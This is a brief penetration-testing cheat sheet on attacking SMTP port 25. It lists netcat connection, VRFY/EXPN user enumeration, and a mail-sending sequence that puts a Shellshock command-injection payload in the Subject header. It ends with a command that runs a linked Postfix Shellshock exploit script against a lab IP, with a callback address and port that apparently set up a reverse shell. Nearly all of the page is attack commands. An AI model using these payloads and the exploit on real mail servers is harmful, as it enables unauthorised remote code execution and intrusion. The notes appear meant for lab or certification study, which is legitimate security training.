---
description: Mail
---

# SMTP 25

### Connection

`nc -C {ip} 25`

### Basic commands

```
VRFY {user} - Check user existence
EXPN {user} - Check if the user belongs to a mailing list
```

### Mail sending

```
mail
mail from:<whatever>
rcpt to:<validemail@mail.server>
data
To: <'validemail@mail.server'>
From: <'validemail@mail.server'>
Subject:() { :; };cmd
.
quit
```

May find a valid email from SMB share `/home/` and `ls`

### Postfix Shellshock (need valid rcpt to email address)

{% embed url="https://github.com/3mrgnc3/pentest_old/blob/master/postfix-shellshock-nc.py" %}
`python2 ./postfix-shellshock-nc.py 10.11.1.231 useradm@mail.local 192.168.119.179 443`
{% endembed %}
